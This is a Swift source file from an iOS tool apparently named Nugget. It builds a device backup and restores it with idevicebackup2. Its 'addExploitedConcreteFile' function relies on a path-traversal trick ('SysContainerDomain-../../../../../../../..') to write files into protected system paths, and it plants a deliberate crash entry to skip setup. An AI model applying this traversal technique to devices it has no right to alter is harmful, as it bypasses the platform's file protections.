//
//  Restore.swift
//  Nugget
//
//  Created by lemin on 9/11/24.
//

import Foundation

struct FileToRestore {
    let contents: Data
    let path: String
    var owner: Int32 = 501
    var group: Int32 = 501
    var usesInodes: Bool = true
}

class RestoreManager {
    static let shared = RestoreManager()
    
    private func addExploitedConcreteFile(list: inout [BackupFile], path: String, contents: Data, owner: Int32 = 501, group: Int32 = 501, inode: UInt64? = nil) {
        let url = URL(filePath: path)
        var basePath: String = "/var/backup"
        if #available(iOS 17, *) {
            // required on iOS 17.0+ since /var/mobile is on a separate partition
            basePath = url.path(percentEncoded: false).hasPrefix("/var/mobile/") ? "/var/mobile/backup" : "/var/backup"
        }
        
        list.append(Directory(path: "", domain:
            /*
             * /var/.backup.i/var/root/Library/Bacdskup/SystemContainers/
             */
            "SysContainerDomain-../../../../../../../..\(basePath)\(url.deletingLastPathComponent().path(percentEncoded: false))", owner: owner, group: group))
        list.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../..\(basePath)\(url.path(percentEncoded: false))", contents: contents, owner: owner, group: group, inode: inode))
    }
    
    private func addRegularConcreteFile(list: inout [BackupFile], path: String, contents: Data, owner: Int32 = 501, group: Int32 = 501, inode: UInt64? = nil, last_path: inout String, last_domain: inout String) {
        let path_items = path.components(separatedBy: "/")
        guard path_items.count > 0 else { return }
        let domain = path_items[0]
        
        // parse the path to the last shared directory
        var startIdx = 0
        if last_domain == domain {
            startIdx = 1
            let last_path_items = last_path.components(separatedBy: "/")
            for (i, last_path_item) in last_path_items.enumerated() {
                if i + 1 < path_items.count && last_path_item == path_items[i + 1] {
                    startIdx += 1
                } else {
                    break
                }
            }
        }
        // add the domain if needed
        if startIdx == 0 {
            list.append(Directory(path: "", domain: domain))
            print(domain)
            startIdx = 1
        }
        last_domain = domain
        var full_path = ""
        // loop through the path items and add the directories if needed
        for i in 1...(path_items.count - 1) {
            if full_path != "" {
                full_path += "/"
            }
            full_path += path_items[i]
            if i >= startIdx {
                print(domain, full_path)
                if i < path_items.count - 1 {
                    last_path = full_path
                    // it is a directory
                    list.append(Directory(path: full_path, domain: domain))
                } else {
                    // it is a file
                    list.append(ConcreteFile(path: full_path, domain: domain, contents: contents, owner: owner, group: group, inode: inode))
                }
            }
        }
        print()
    }
    
//    func restoreFile(_ contents: Data, udid: String) {
//        let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
//        let folder = documentsDirectory.appendingPathComponent(udid, conformingTo: .data)
//        
//        do {
//            try? FileManager.default.removeItem(at: folder)
//            try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: false)
//            
//            var backupFiles: [BackupFile] = [
//                Directory(path: "", domain: "HomeDomain"),
//                Directory(path: "Library", domain: "HomeDomain"),
//                Directory(path: "Library/Preferences", domain: "HomeDomain")
//            ]
//        } catch {
//            print(error.localizedDescription)
//            return
//        }
//    }
    
    func restoreFiles(_ files: [FileToRestore], udid: String) {
        let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let folder = documentsDirectory.appendingPathComponent(udid, conformingTo: .data)
        
        do {
            try? FileManager.default.removeItem(at: folder)
            try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: false)
            
            // sort the file domains
            let sortedFiles = files.sorted { file1, file2 in
                // move exploited files to the back
                if file1.path.starts(with: "/") && !file2.path.starts(with: "/") {
                    return false
                } else if !file1.path.starts(with: "/") && file2.path.starts(with: "/") {
                    return true
                }
                return file1.path < file2.path
            }
            
            var backupFiles: [BackupFile] = [
                Directory(path: "", domain: "RootDomain"),
                Directory(path: "Library", domain: "RootDomain"),
                Directory(path: "Library/Preferences", domain: "RootDomain")
            ]
            
            // create the inode links
            for (index, file) in sortedFiles.enumerated() {
                if file.usesInodes {
                    backupFiles.append(ConcreteFile(
                        path: "Library/Preferences/temp\(index)",
                        domain: "RootDomain",
                        contents: file.contents,
                        owner: file.owner,
                        group: file.group,
                        inode: UInt64(index)))
                }
            }
            
            // add the domains and files
            // keep track of the last path and domain
            var last_path: String = ""
            var last_domain: String = ""
            var exploit_only = true
            for (index, file) in sortedFiles.enumerated() {
                // for non exploit domains, the path will not start with /
                if file.path.starts(with: "/") {
                    // file utilizes exploit
                    addExploitedConcreteFile(list: &backupFiles, path: file.path, contents: file.usesInodes ? Data() : file.contents, owner: file.owner, group: file.group, inode: file.usesInodes ? UInt64(index) : nil)
                } else {
                    // file is a regular domain, does not utilize exploit
                    exploit_only = false
                    addRegularConcreteFile(list: &backupFiles, path: file.path, contents: file.usesInodes ? Data() : file.contents, owner: file.owner, group: file.group, inode: file.usesInodes ? UInt64(index) : nil, last_path: &last_path, last_domain: &last_domain)
                }
            }
            
            // break the hard links
            for (index, file) in sortedFiles.enumerated() {
                if file.usesInodes {
                    backupFiles.append(ConcreteFile(
                        path: "",
                        domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp\(index)",
                        contents: Data(),
                        owner: 501,
                        group: 501))
                }
            }
            
            // crash on purpose to skip setup (only works with exploit files)
            if exploit_only {
                backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data(), owner: 501, group: 501))
            }
            
            // create backup
            let mbdb = Backup(files: backupFiles)
            try mbdb.writeTo(directory: folder)
            
            // Restore now
            let restoreArgs = [
                "idevicebackup2",
                "-n", "restore", "--no-reboot", "--system",
                documentsDirectory.path(percentEncoded: false)
            ]
            print("Executing args: \(restoreArgs)")
            var argv = restoreArgs.map{ strdup($0) }
            let result = idevicebackup2_main(Int32(restoreArgs.count), &argv)
            print("idevicebackup2 exited with code \(result)")
        } catch {
            print(error.localizedDescription)
            return
        }
    }
}